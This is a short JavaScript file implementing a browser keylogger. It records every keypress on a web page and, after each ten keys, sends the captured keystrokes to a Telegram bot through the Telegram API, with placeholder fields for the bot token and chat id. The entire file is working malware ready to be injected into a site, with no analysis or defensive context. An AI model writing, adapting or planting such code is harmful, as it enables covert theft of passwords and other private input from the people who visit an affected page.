let storedData = [];
document.addEventListener("DOMContentLoaded", () => {
  document.addEventListener("keypress", (event) => {
    storedData.push(event.key)
    console.log(storedData);
    
    if (storedData.length === 10) {
      sendDataToTelegram();
      storedData = [];
    }
  });
});

let sendDataToTelegram = () => {
  let botToken = "Enter your Telegram bot token here.";
  let chatId = "Enter your Telegram chat id here.";
  let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${storedData}`;
  
  let request = new XMLHttpRequest();
  request.open("GET", url, true);
  request.send()
}; 
